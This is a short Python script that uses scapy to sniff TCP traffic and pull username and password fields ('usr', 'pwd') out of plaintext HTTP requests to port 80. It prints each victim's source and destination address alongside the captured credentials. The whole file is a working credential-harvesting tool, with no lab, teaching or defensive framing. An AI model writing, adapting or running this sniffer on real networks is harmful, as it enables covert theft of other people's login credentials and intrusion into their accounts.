#!/usr/bin/python3
from scapy.all import *
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import re

def packet_callback(packet):
    if packet[TCP].payload:
        pkt = str(packet[TCP].payload)
        if packet[IP].dport == 80:
            tok1, tok2, tok3, tok4 = "usr", "pwd", "&pwd", "&btn"
            index1 = pkt.find(tok1)
            index2 = pkt.find(tok2)
            index3 = pkt.find(tok3)
            index4 = pkt.find(tok4)
            print("\n{} ----HTTP----> {}:{}\n".format(packet[IP].src, packet[IP].dst, packet[IP].dport))
            print(pkt[index1:index3]+"  "+pkt[index2:index4])

ppp = sniff(filter="tcp", prn=packet_callback, store=0)
# print("------")
# ppp.show()